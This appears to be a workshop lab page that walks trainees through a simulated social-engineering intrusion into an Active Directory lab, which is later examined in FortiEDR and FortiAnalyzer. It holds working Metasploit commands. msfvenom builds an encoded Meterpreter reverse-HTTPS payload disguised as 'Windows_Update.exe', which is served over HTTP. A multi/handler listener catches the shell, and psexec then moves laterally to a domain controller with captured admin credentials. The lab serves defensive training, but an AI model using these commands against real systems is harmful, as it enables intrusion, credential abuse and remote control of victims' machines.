---
title: Using Kali Linux
menuTitle: Command & Control
weight: 30
---

![](kali_logo.png?width=300px)

Please follow along as the instructor walks through a live attack scenario in which a user is the target of social engineering. In this scenario the user downloads a file that leads to initial access into an active directory environment. 

As the scenario progresses be mindful of various tactics and techniques that are documented in the MITRE ATT&CK framework. Subsequently, we'll spend time investing this attack within FortiEDR and FortiAnalyzer to understand how these attacks look from a defender's perspective.

### Create A Payload

1. Check the IP address of your Kali machine. You'll need this to configure the payload we're about to generate.
    - ```ip addr show eth0```
2. Create a new directory named "payloads" and then change to that directory:
    - ```mkdir payloads```
    - ```cd payloads```
3. You'll use a tool called [MSFvenom](https://www.offsec.com/metasploit-unleashed/msfvenom/) to create a custom payload for your target. The following command will create a file named *"Windows_Update.exe"* in the *"payloads"* directory. Pay close attention to the **lhost** argument, this will need to be the ip address of your Kali machine that we checked in step 1. The **lport** argument is the port that we'll use later when we configure a *listener*:
    - ```msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai -i 1 lport=8443 lhost=192.168.157.134 -b "\x00" -f exe -o Windows_Update.exe```
4. Finally, you'll start a simple HTTP server so that you can serve the newly created payload to your target:
    - `python3 -m http.server`
5. This is an example of what the expected commands and output will look like:
![payload](01_payload.png?width=700px)

{{% notice note %}}Please note that in this case the HTTP server is listening on port **8000**. Your instance may be different, or you can issue other commands to change the port to one that you may prefer.{{% /notice %}}

### Setting Up Metasploit for Command & Control (C2)

Now we'll use [Metasploit](https://www.metasploit.com/) to create a *handler* that will listen for connections as a result of our payload. This is known as a *reverse shell*.

1. The msfconsole is probably the most popular interface to the Metasploit Framework (MSF). It provides an “all-in-one” centralized console and allows you efficient access to virtually all of the options available in the MSF:
    - `msfconsole`
2. Next, we tell it that we’d like to use the generic payload handler, the “multi-handler” module.
    - `use exploit/multi/handler`
3. We need to tell the multi-handler what payload type is connecting back, using the same value we used in our msfvenom command:
    - `set PAYLOAD windows/meterpreter/reverse_https`
4. We need to tell the multi-handler what IP address to listen on – this will correspond to the LHOST value we set in our msfvenom command:
    - `set LHOST 192.168.157.134`
5. We'll also set the listening port to correspond to the LPORT value we set in our msfvenom command:
    - `set LPORT 8443`
6. `set ExitOnSession false`
7. Finally, we run “exploit” to start this module, passing the “-j” option to make this a background job, allowing us to continue running other commands in Metasploit, if we like:
    - `exploit -j`
8. This is an example of what the expected commands and output will look like:
![msfconsole](02_msfconsole.png?width=700px)

## Lateral Movement

After initial compromise of a domain workstation the instructor will laterally move to the Domain Controller. If you'd like to replicate this in your lab environment the following steps can be taken from Meterpreter:
1. Press `Ctrl + Z` to send the current session to the background
2. We will use the windows/smb/psexec module. This module uses a valid administrator username and password (or password hash) to execute an arbitrary payload. This module is similar to the "psexec" utility provided by SysInternals. This will automatically run a Powershell command if the target detects Powershell on the machine:
    - `use exploit/windows/smb/psexec`
3. Set the target to the IP address of the domain controller that was discovered during initial compromise:
    - `set rhost 192.168.157.142`
4. Set target domain
    - `set SMBDomain LOST.local`
5. Set gathered admin credentials
    - `set SMBUser administrator`
    - `set SMBPass P@$$w0rd!`
6. Configure sessions information
    - `set SESSION 2`
7. Launch exploit
    - `exploit -j`
